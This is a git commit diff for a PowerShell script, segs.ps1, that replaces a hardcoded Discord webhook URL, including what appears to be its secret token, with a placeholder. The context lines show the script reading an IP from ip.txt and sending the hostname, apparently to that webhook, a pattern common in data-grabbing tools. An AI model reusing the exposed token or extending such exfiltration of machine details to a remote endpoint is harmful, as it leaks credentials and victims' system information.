3e91b85933d27964cec542007d88177791ca14e2
DorkYBru <76796721+DorkYBru@users.noreply.github.com>
2022-05-14 19:26:35 +0000

    Update segs.ps1

--- segs.ps1
+++ segs.ps1
@@ -1,4 +1,4 @@
-$webhookUri = 'https://discord.com/api/webhooks/975110209783603250/Ugh-g7pt6xHt642IoJe0Hl_GCT_TLxgWzZ-FvHthZje_-pc6cEnHLY7jEITbH_rvZOXd'
+$webhookUri = 'Your Webhook'
 $ip = Get-Content ip.txt
 $Body = @{
   'username' = hostname
